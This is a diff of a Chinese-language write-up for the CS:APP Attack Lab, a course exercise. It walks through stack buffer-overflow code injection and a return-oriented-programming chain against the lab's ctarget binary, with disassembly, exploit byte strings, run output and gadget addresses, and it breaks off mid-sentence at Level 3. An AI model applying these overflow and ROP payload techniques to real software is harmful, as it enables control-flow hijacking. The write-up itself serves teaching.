@@ -2,9 +2,84 @@
 
 这一部分的讲义中提到程序设定为运行时栈内存的地址不发生变化，因此通过`gdb`可以查看内存，进行数据和代码的注入。
 
+## Level 1
+
+这部分实验主要是学会分析程序，了解代码注入的基本原理。首先我们看一下测试的`test()`代码：
+
+```c
+int test() {
+    int val;
+    val = getbuf();
+    printf("No exploit. Getbuf returned 0x%x\n", val);
+}
+```
+
+这部分代码表明用一个`getbuf`函数进行读取，而上文已经给出了`getbuf`函数的代码：
+
+```c
+unsigned getbuf()
+{
+    char buf[BUFFER_SIZE];
+    Gets(buf);
+    return 1;
+}
+```
+
+其中`Get`函数封装了`get`函数。这里新开了一个大小为`BUFFER_SIZE`大小的char array，将输入的缓存存储在array中，并返回。我们的注入的代码或者数据只能通过这个唯一的输入口来完成，因此需要构造出可以进行攻击的字节序列。由于C的数组并没有边界检查，因此
+
+通过命令反编译得到`ctarget`的汇编代码`ctarget.asm`：
+
+```bash
+objdump -d ctarget > ctarget.asm
+```
+
+查看汇编程序的`getbuf`函数：
+
+```asm
+00000000004017a8 <getbuf>:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp
+  4017bd:	c3                   	retq   
+  4017be:	90                   	nop
+  4017bf:	90                   	nop
+```
+
+可以发现这里使用栈来存储char array的内容。完成后将栈顶指针复原并返回。这里的`BUFFER_SZIE`的值为`0x28(=40)`。而栈顶指针复原后即返回函数。我们知道`retq`指令将栈顶存储的地址作为返回值进行跳转。我们希望跳转到`touch1()`，因此就将这个函数的地址`0x4017c0`作为跳转的地址覆盖`test()`函数的返回地址，这样就可以完成跳转。
+
+总的来说，我们将希望跳转的地址写到一个字符序列中，让输入的字符产生越界，覆盖原本的返回地址，跳转到我们期望的地址。由于部分字符无法通过标准输入通过键盘敲出，因此附录A给出了工具`hex2raw`的程序将给定格式的十六进制数转化为对应的源字符。这里注意是从低地址写往高地址，因此返回地址组织为`c0 17 40 00 00 00 00 00`。这样我们就得到了第一个攻击序列，参考`exploit1.txt`：
+
+```txt
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+c0 17 40 00 00 00 00 00
+```
+
+通过命令转化为字符后作为标准输入即可：
+
+```bash
+root@2e753e36cee9:/csapp/lab/target1# ./hex2raw < exploit1.txt > exploit-raw1.txt
+root@2e753e36cee9:/csapp/lab/target1# ./ctarget -q < exploit-raw1.txt
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
+```
+
+即可顺利完成实验。
+
 ## Level 2
 
-通过查看内存可以发现，当执行`getbuf()`时，栈顶指针`%rsp`指向的地址为`0x5561dc78`，查看`%rsp -> %rsp + 48`这一段内存：
+这部分实验需要注入x86-64汇编代码的二进制形式，转换方法参考附录B。根据要求，我们需要把代码写到char array中。首先我们需要知道写入的地址，从而完成返回跳转。通过查看内存可以发现，当执行`getbuf()`时，栈顶指针`%rsp`指向的地址为`0x5561dc78`，查看`%rsp -> %rsp + 48`这一段内存：
 
 ```bash
 (gdb) b *0x4017b4
@@ -136,3 +211,73 @@ retq
 ```
 
 可以发现由于我们注入的`retq`指令调用后，栈指针向高地址移动后，原来的内容被覆盖了，因此实验讲义的advice提示我们要再三考虑存放cookie字符串的位置。
+
+## Part II: Return-Oriented Programming
+
+这部分实验中增加了难度：
+
+1. 栈采用随机化，因此每次运行时栈的地址是不确定的，无法将PC指向buffer的位置；
+2. 栈区的代码是不可执行的，因此即使注入了代码也会出现segmentation fault。
+
+但是实验提供了另一种方案，参考讲义。
+
+## Level 2
+
+这部分实验需要实现Phase2的攻击。讲义的advice中提示栈中需要组织Gadget的地址和数据的混合，因此尽管逻辑上Gadget的地址组成一个链表，但是实际上我们需要把要传入的数据和Gadget地址进行混合。Gadget中可以使用`movq`指令，但是指令源寄存器数据只能由我们自己传入，因此直觉上来说数据应该这样组织：
+
+```
+Gadget_1
+Data_1
+Data_2
+...
+Data_n
+Gadget_2
+...
+```
+
+这样，先修改`getbuf`函数的返回地址，跳转到Gadget1，执行`popq`将`Data_i`存储到目标寄存器（设置参数），栈顶指针移动，直到指向Gadget2的地址后，gadget1的`retq`指令将PC指向gadget2，再执行gadget2的程序，以此类推。最后把`touch3()`的地址写到最后一个gadget中跳转。
+
+由于Phase2只需要将cookie的数值作为参数传入，结合给定的gadget farm，我们推断出如下指令可以完成任务：
+
+```asm
+58          popq %rax
+48 89 c7    movq %rax, %rdi
+```
+
+此时`Data_1 = ${cookie} = 0x59b997fa`。
+
+中间可能会出现`90`(`nop`指令)，这里忽略掉。通过检索文档可以找到包含`popq %rax`指令字节序列的gadget1：
+
+```asm
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq 
+```
+
+`ADDR(gadget1) = 0x4019ab`。同样的可以检索到包含`movq %rax, %rdi`指令字节序列的gadget2：
+
+```asm
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq
+```
+
+`ADDR(gadget2) = 0x4019c5`。最后将`touch3()`函数的地址作为gadget3的地址`ADDR(gadget3) = 0x4017ec`。
+
+组织exploit的内容如下：
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+c5 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+## Level 3
+
+这部分实验
